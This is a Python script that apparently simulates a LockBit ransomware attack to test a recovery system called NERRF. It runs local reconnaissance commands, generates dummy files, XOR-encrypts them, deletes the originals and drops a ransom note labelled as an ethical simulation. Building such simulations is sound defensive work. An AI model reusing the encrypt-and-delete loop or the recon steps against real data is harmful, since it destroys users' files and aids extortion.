#!/usr/bin/env python3
"""
NERRF M1 Enterprise-Scale LockBit Simulator
Scales up to 100-128 MB across 45-50 files for realistic testing
"""
import os
import time
import secrets
import pathlib
import json
import hashlib
from datetime import datetime

TARGET = "/app/uploads"
EXT = ".lockbit3"
README = "README_LOCKBIT.txt"
RATE_LIMIT = 2.0  # MB/sec - slightly faster for larger dataset
MIN_FILES = 45
MAX_FILES = 50
MIN_FILE_SIZE = 2 * 1024 * 1024  # 2 MB
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB
TARGET_TOTAL_SIZE = 110 * 1024 * 1024  # ~110 MB target

def log_event(event_type, path, size=0, metadata=None):
    """Enhanced logging with metadata for M1"""
    timestamp = datetime.utcnow().isoformat()
    event = {
        "timestamp": timestamp,
        "event": event_type,
        "path": str(path),
        "size": size,
        "pid": os.getpid(),
        "phase": metadata.get("phase", "unknown") if metadata else "unknown",
        "file_type": metadata.get("file_type", "document") if metadata else "document"
    }
    print(f"TRACE: {json.dumps(event)}")

def generate_realistic_filename(index, file_type="document"):
    """Generate realistic enterprise filenames"""
    file_types = {
        "document": ["report", "proposal", "analysis", "presentation", "memo", "contract"],
        "spreadsheet": ["budget", "forecast", "data", "inventory", "sales", "expenses"],
        "database": ["customer", "employee", "product", "transaction", "backup", "archive"],
        "media": ["image", "video", "audio", "graphics", "design", "photo"]
    }
    
    prefixes = file_types.get(file_type, file_types["document"])
    suffix_nums = ["2025", "Q3", "final", "v2", "backup", "draft"]
    
    prefix = secrets.choice(prefixes)
    suffix = secrets.choice(suffix_nums)
    
    return f"{prefix}_{suffix}_{index:03d}"

def seed_enterprise_files():
    """Create realistic enterprise file dataset"""
    pathlib.Path(TARGET).mkdir(parents=True, exist_ok=True)
    log_event("seed_start", TARGET, metadata={"phase": "preparation"})
    
    # Determine number of files to create
    num_files = secrets.randbelow(MAX_FILES - MIN_FILES + 1) + MIN_FILES
    
    # Calculate target size per file to reach ~110 MB total
    target_size_per_file = TARGET_TOTAL_SIZE // num_files
    
    total_size = 0
    file_types = ["document", "spreadsheet", "database", "media"]
    
    print(f"[M1] Creating {num_files} enterprise files targeting {TARGET_TOTAL_SIZE/1024/1024:.1f} MB total")
    
    for i in range(num_files):
        # Vary file sizes realistically
        size_variation = secrets.randbelow(int(target_size_per_file * 0.4)) - int(target_size_per_file * 0.2)
        file_size = max(MIN_FILE_SIZE, min(MAX_FILE_SIZE, target_size_per_file + size_variation))
        
        # Assign file type
        file_type = secrets.choice(file_types)
        filename = generate_realistic_filename(i, file_type)
        file_path = pathlib.Path(TARGET) / f"{filename}.dat"
        
        # Create file with realistic content patterns
        with open(file_path, 'wb') as f:
            written = 0
            chunk_size = 64 * 1024  # 64KB chunks
            
            while written < file_size:
                remaining = file_size - written
                current_chunk_size = min(chunk_size, remaining)
                
                # Create semi-realistic data patterns
                if file_type == "database":
                    # More structured/repeated patterns for databases
                    chunk = (secrets.token_bytes(current_chunk_size // 4) * 4)[:current_chunk_size]
                elif file_type == "media":
                    # More random data for media files
                    chunk = secrets.token_bytes(current_chunk_size)
                else:
                    # Mixed patterns for documents/spreadsheets
                    chunk = secrets.token_bytes(current_chunk_size)
                
                f.write(chunk)
                written += current_chunk_size
                
                # Show progress for large files
                if written % (1024 * 1024) == 0:  # Every 1 MB
                    progress = (written / file_size) * 100
                    print(f"    Creating {filename}.dat: {progress:.0f}% ({written/1024/1024:.1f}MB)")
        
        total_size += file_size
        log_event("file_created", file_path, file_size, {
            "phase": "preparation", 
            "file_type": file_type,
            "target_size": target_size_per_file
        })
        
        print(f"[+] Created: {filename}.dat ({file_size/1024/1024:.2f} MB, type: {file_type})")
        
        # Small delay between files to simulate realistic timing
        time.sleep(0.2)
    
    print(f"[M1] Seeded {num_files} files, total size: {total_size/1024/1024:.2f} MB")
    log_event("seed_complete", TARGET, total_size, {"phase": "preparation", "file_count": num_files})
    
    return num_files, total_size

def encrypt_enterprise_files():
    """Enhanced encryption simulation for enterprise scale"""
    files = list(pathlib.Path(TARGET).glob("*.dat"))
    if not files:
        print("[-] No .dat files found to encrypt!")
        return
    
    log_event("encryption_start", TARGET, metadata={"phase": "attack"})
    
    ransom_note = """
╔═════════════════════════════════════════════════════════════════════════╗
║                      *** LOCKBIT 3.0 ENTERPRISE SIM ***                ║
║                                                                         ║
║  This is an ETHICAL M1 SIMULATION for NERRF enterprise testing         ║
║                                                                         ║
║  Your enterprise files have been encrypted for research validation.     ║
║  Total encrypted: {file_count} files (~{total_mb} MB)                  ║
║                                                                         ║
║  NERRF M1 Recovery Target: MTTR < 60 minutes, Loss < 128 MB            ║
║                                                                         ║
║  To restore: rename *.lockbit3 files back to *.dat                     ║
╚═════════════════════════════════════════════════════════════════════════╝
"""
    
    encrypted_count = 0
    total_encrypted_size = 0
    start_time = time.time()
    
    # Sort files by size for consistent processing
    files_with_sizes = [(f, f.stat().st_size) for f in files]
    files_with_sizes.sort(key=lambda x: x[1], reverse=True)  # Largest first
    
    print(f"[M1] Starting encryption of {len(files)} files...")
    
    for file_path, original_size in files_with_sizes:
        if not file_path.exists():
            continue
            
        log_event("file_encrypt_start", file_path, original_size, {"phase": "attack"})
        encryption_start = time.time()
        
        # Read and encrypt in chunks with progress tracking
        encrypted_path = file_path.with_suffix(EXT)
        
        with open(file_path, 'rb') as src, open(encrypted_path, 'wb') as dst:
            # Generate file-specific encryption key
            key = hashlib.sha256(f"lockbit_m1_key_{file_path.name}".encode()).digest()
            
            processed = 0
            chunk_size = 256 * 1024  # 256KB chunks for faster processing
            
            while True:
                chunk = src.read(chunk_size)
                if not chunk:
                    break
                
                # Enhanced XOR encryption with rotation
                encrypted_chunk = bytearray()
                for i, byte in enumerate(chunk):
                    key_byte = key[(i + processed) % len(key)]
                    encrypted_chunk.append(byte ^ key_byte)
                
                dst.write(encrypted_chunk)
                processed += len(chunk)
                
                # Rate limiting for realism
                elapsed = time.time() - encryption_start
                expected_time = processed / (RATE_LIMIT * 1024 * 1024)
                if elapsed < expected_time:
                    sleep_time = expected_time - elapsed
                    time.sleep(sleep_time)
                
                # Progress reporting for large files
                if processed % (5 * 1024 * 1024) == 0:  # Every 5 MB
                    progress = (processed / original_size) * 100
                    rate = processed / (time.time() - encryption_start) / 1024 / 1024
                    print(f"    Encrypting {file_path.name}: {progress:.0f}% ({rate:.1f} MB/s)")
        
        # Remove original file
        file_path.unlink()
        
        encrypted_count += 1
        total_encrypted_size += original_size
        encryption_time = time.time() - encryption_start
        
        log_event("file_encrypt_complete", encrypted_path, original_size, {
            "phase": "attack",
            "encryption_time": encryption_time,
            "throughput_mbps": (original_size / 1024 / 1024) / encryption_time
        })
        
        print(f"[+] Encrypted: {file_path.name} -> {encrypted_path.name} ({original_size/1024/1024:.2f} MB, {encryption_time:.1f}s)")
    
    # Write enhanced ransom note
    ransom_content = ransom_note.format(
        file_count=encrypted_count,
        total_mb=int(total_encrypted_size / 1024 / 1024)
    )
    
    ransom_path = pathlib.Path(TARGET) / README
    with open(ransom_path, 'w') as f:
        f.write(ransom_content)
    
    total_time = time.time() - start_time
    avg_throughput = (total_encrypted_size / 1024 / 1024) / total_time
    
    log_event("ransom_note_created", ransom_path, len(ransom_content), {"phase": "attack"})
    log_event("encryption_complete", TARGET, total_encrypted_size, {
        "phase": "attack",
        "total_time": total_time,
        "avg_throughput_mbps": avg_throughput,
        "file_count": encrypted_count
    })
    
    print(f"[M1] Encryption complete: {encrypted_count} files, {total_encrypted_size/1024/1024:.2f} MB")
    print(f"[M1] Total time: {total_time:.1f}s, Average throughput: {avg_throughput:.2f} MB/s")
    print(f"[M1] Ransom note: {ransom_path}")

def simulate_advanced_reconnaissance():
    """Enhanced reconnaissance for enterprise environment"""
    log_event("lateral_movement_start", "/", metadata={"phase": "reconnaissance"})
    
    recon_commands = [
        ("process_enum", "ps aux > /tmp/processes.txt 2>/dev/null || true"),
        ("network_enum", "netstat -an > /tmp/network.txt 2>/dev/null || true"),
        ("user_enum", "whoami > /tmp/users.txt 2>/dev/null || true"),
        ("disk_enum", "df -h > /tmp/disk.txt 2>/dev/null || true"),
        ("mount_enum", "mount > /tmp/mounts.txt 2>/dev/null || true")
    ]
    
    for recon_type, command in recon_commands:
        try:
            os.system(command)
            log_event(recon_type, f"/tmp/{recon_type.split('_')[0]}.txt", metadata={"phase": "reconnaissance"})
            time.sleep(0.5)  # Realistic delay between recon activities
        except:
            pass
    
    log_event("lateral_movement_complete", "/", metadata={"phase": "reconnaissance"})

def main():
    """Main M1 enterprise simulation flow"""
    print("=" * 70)
    print("NERRF M1 Enterprise-Scale LockBit Simulation")
    print("Target: 100-128 MB across 45-50 files (2-5 MB each)")
    print("=" * 70)
    
    start_time = datetime.utcnow()
    log_event("simulation_start", TARGET, metadata={"phase": "initial"})
    
    try:
        # Phase 1: Initial access
        print("[Phase 1] Initial access - SIMULATED")
        time.sleep(1)
        
        # Phase 2: Enhanced reconnaissance
        print("[Phase 2] Advanced reconnaissance and discovery")
        simulate_advanced_reconnaissance()
        time.sleep(3)
        
        # Phase 3: Enterprise file seeding
        print("[Phase 3] Creating enterprise dataset")
        num_files, total_size = seed_enterprise_files()
        time.sleep(2)
        
        # Phase 4: Large-scale encryption
        print("[Phase 4] Starting enterprise-scale encryption")
        encrypt_enterprise_files()
        
        # Phase 5: Persistence and C2
        print("[Phase 5] Establishing persistence and C2")
        time.sleep(3)
        
        end_time = datetime.utcnow()
        duration = (end_time - start_time).total_seconds()
        
        log_event("simulation_complete", TARGET, metadata={
            "phase": "complete",
            "total_duration": duration,
            "files_processed": num_files,
            "total_size_mb": total_size / 1024 / 1024
        })
        
        print(f"[M1] Simulation complete in {duration:.1f} seconds")
        print(f"[M1] Enterprise attack artifacts in: {TARGET}")
        print(f"[M1] Files to recover: {len(list(pathlib.Path(TARGET).glob('*.lockbit3')))}")
        print(f"[M1] Total data encrypted: {total_size/1024/1024:.2f} MB")
        
        # Keep pod alive for extended trace collection
        print("[M1] Keeping pod alive for 60 seconds for trace collection...")
        time.sleep(60)
        
    except Exception as e:
        log_event("simulation_error", str(e), metadata={"phase": "error"})
        print(f"[-] M1 Simulation error: {e}")
        raise

if __name__ == "__main__":
    main()
